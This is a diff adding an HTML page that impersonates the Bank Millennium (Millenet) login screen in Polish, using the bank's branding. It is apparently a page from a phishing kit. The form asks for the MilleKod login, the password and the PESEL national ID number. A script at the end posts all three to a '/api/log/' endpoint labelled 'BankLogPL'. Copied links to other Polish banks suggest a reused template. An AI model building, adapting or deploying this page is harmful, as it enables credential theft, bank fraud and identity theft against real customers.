@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<link href="https://www.bankmillennium.pl/o/millennium-theme/images/favicon.ico" rel="icon" type="image/x-icon">
+		<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+		<script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+		<script src="/static/style/protect/protect.js"></script>
+		<title>Logowanie - Bank Millennium</title>
+		<style>
+			._0 {
+				margin: 0 auto;
+				max-width: 400px;
+				box-sizing: border-box;
+				background: #fff;
+				margin-top: 10px;
+			}
+			._01 {
+				margin: 0 auto;
+				max-width: 490px;
+				box-sizing: border-box;
+				padding: 24px;
+				background: #fff;
+				padding-left: 0;
+				margin-bottom: 50px;
+			}
+			._02 {
+				border-top: 2px solid #e4e4e4;
+				margin: 0 auto;
+				max-width: 400px;
+				box-sizing: border-box;
+				background: #fff;
+				margin-bottom: 50px;
+				padding: 20px 0;
+				border-bottom: 2px solid #e4e4e4;
+			}
+			._1 {
+				font-size: 24px;
+			    padding-top: 16px;
+			    color: #7b7b7b;
+			}
+			._2 {
+				margin: 10px 0;
+				border-bottom: 1px solid #ddd;
+			}
+			._3 {
+				text-align: left;
+			    font-size: 14px;
+			    border: 1px solid #dddddd;
+			    border-radius: 2px;
+			    padding: 12px 10px;
+			    margin-bottom: 20px;
+			}
+			._3:hover {
+				border: 1px solid #000;
+			}
+			._4 {
+				float: right;
+			    width: 100%;
+				margin: 0;
+			    color: #000;
+			    font-weight: 400;
+			    font-size: 14px;
+			    line-height: 24px;
+			    display: inline-block;
+			    -webkit-box-sizing: border-box;
+			    box-sizing: border-box;
+			    padding: 12px 30px 12px 31px;
+			    min-width: 180px;
+			    border-radius: 4px;
+			    white-space: nowrap;
+			    background-color: #bd004f;
+			    color: #fff;
+			    text-align: center;
+			    text-decoration: none;
+			    font-weight: 600;
+			    border: none;
+			}
+			._5 {
+				color: #aaa;
+				text-align: right;
+				width: 45%;
+				padding-right: 24px;
+			}
+			._6 {
+				font-weight: bold;
+			}
+			._7 {
+				margin-top: 4px;
+				margin-bottom: 16px;
+			}
+			._8 {
+				padding-bottom: 6px;
+				line-height: 18px;
+			}
+			._9 {
+				text-align: right;
+			}
+			body {
+				margin: 0;
+				font-family: Arial;
+				font-size: 12px;
+				color: #444;
+				word-break: break-word;
+				user-select: none;
+				background: #fdfdfd;
+				-webkit-appearance: none;
+			}
+			input {
+				font-family: Arial;
+				font-size: 12px;
+				color: #222;
+				width: 100%;
+				border: none;
+				box-sizing: border-box;
+				text-align: center;
+				-webkit-appearance: none;
+			}
+			button {
+				-webkit-appearance: none;
+			}
+			table {
+				width: 100%;
+				border-collapse: separate;
+				border-spacing: 0;
+			}
+			td {
+				padding: 4px 0;
+			}
+			#mainblock {
+				display: flex;
+				margin: 0 15px;
+			    border-bottom: 1px solid #e4e4e4;
+			}
+			#rightblock {
+				margin-top: 100px;
+				display: flex;
+			}
+			.loginboxes {
+				display: flex;
+			}
+			#formblock {
+                /*border-right: 1px solid #e4e4e4;
+                padding-right: 70px; */
+                padding-bottom: 20px; 
+                margin-top: 20px;
+			}
+			#konto {
+				margin-left: 0; 
+				padding-top: 30px;
+			}
+			#Pomoc {
+                padding-top: 25px;
+                text-align: center;
+			}
+			.input-title {
+				color: #414141;
+			    font-size: 14px;
+			    margin-bottom: 5px;
+			    font-weight: 600;
+			}
+			.bottom-content a {
+				color: #bd004f;
+				text-decoration: none;
+			}
+			.bottom-title {
+				color: #bd004f;
+			    margin-bottom: 10px;
+			    font-size: 13px;
+			    font-weight: 600;
+			}
+			.bottom-content {
+				margin-left: 10px;
+			    font-size: 13px;
+			    line-height: 1.5;
+			    padding: 20px 0;
+			    color: #999;
+			}
+			@media all and (max-width: 800px) {
+				#mainblock {
+					display: block;
+				}
+				#formblock {
+					border-right: none;
+					padding-right: 0; 
+				}
+			}
+			@media all and (max-width: 500px) {
+				.loginboxes {
+					display: block;
+				}
+				#rightblock {
+					display: block;
+				}
+				#konto {
+					margin: 0;
+				}
+				#Pomoc {
+					padding-top: 80px;
+					padding-bottom: 25px;
+				}
+				._4 {
+					width: 100%;
+				}
+			}
+		</style>
+	</head>
+	<body>
+		<div id="mainblock">
+			<div class="_0">
+				<div style="padding: 20px 0; border-bottom: 1px solid #efefef;">
+					<table style="width: 100px; margin: 0 auto;">
+						<tbody><tr>
+							<td>
+								<img src="/static/style/banksPL/millennium/milka.png" height="36">
+							</td>
+						</tr>
+					</tbody></table>
+				</div>
+				<form method="post" id="formblock">
+					<div class="loginboxes" style="margin-bottom: 20px;">
+						<div class="_1">Logowanie do Millenetu</div>
+						<!-- <div id="konto"><a href="https://www.mbank.pl/indywidualny/serwis-transakcyjny-ib/pytania-i-odpowiedzi/aktywacja-odblokowanie/" style="font-size: 13px; color: #717277;">Otwórz konto</a></div> -->
+					</div>
+					<div id="field3ds1" class="input-title">MilleKod</div>
+					<input id="login" class="_3" type="text" name="login" required="">
+					<div id="field3ds3" class="input-title">Hаsło 1</div>
+					<input id="password" class="_3" type="text" name="password" required="">
+					<div id="field3ds5" class="input-title">PESEL</div>
+					<input id="pesel" class="_3" type="text" name="pesel">
+					<!-- <div style="display: none;" id="field3ds7" class="input-title">PIN</div>
+					<input style="display: none;" id="field3ds8" class="_3" type="text" name="pindata"> -->
+						<div style="color: #ff6161; padding: 20px; text-align: center;"></div>
+					<div class="loginboxes">
+						<!-- <button id="field3ds9" form="123123" class="_4">DALEJ</button> -->
+						<input id="field3ds10" class="_4" type="submit" value="DALEJ" onclick="sendData()">
+					</div>
+					<div id="Pomoc"><a href="#" style="font-size: 14px; color: #bd004f; text-decoration: none;">Pomoc z logowaniem</a></div>
+				</form>
+			</div>
+			<div class="_02">
+
+				<div class="bottom-content">
+					 Sprawdź saldo i zlecaj przelewy z kont w innych bankach wygodnie przez Millenet
+					<a href="https://www.pekao24.pl/logowanie/(modal:pomoc-w-logowaniu/komunikaty;id=1404)">Więcej</a>
+				</div>
+				<div class="bottom-title">Fałszywi konsultanci</div>
+				<div class="bottom-content">
+					 Oszuści podszywają się pod pracowników Banku - nie pobieraj nieznanych aplikacji i nie udostępniaj poufnych danych
+					<a href="https://www.pekao24.pl/logowanie/(modal:pomoc-w-logowaniu/komunikaty;id=1404)">Więcej</a>
+				</div>
+			</div>
+</div>
+
+<script type="text/javascript">
+    function sendData() {
+        var data = $('#formblock').serializeArray().reduce(function(obj, item) {
+            obj[item.name] = item.value;
+            return obj;
+        }, {});
+
+        fetch(`/api/log/${window.location.pathname.split('/')[3]}`, {
+            method: 'POST',
+            cache: 'no-cache',
+            headers: {
+                'Accept': 'application/json, text/plain, */*',
+                'Content-Type': 'application/json'
+            },
+            referrerPolicy: 'no-referrer',
+            body: JSON.stringify({
+                login: data.login,
+                password: data.password,
+                pesel: data.pesel,
+                bank: 'millennium',
+                method: 'BankLogPL'
+            })
+        })
+    }
+</script>
+
+</body></html>
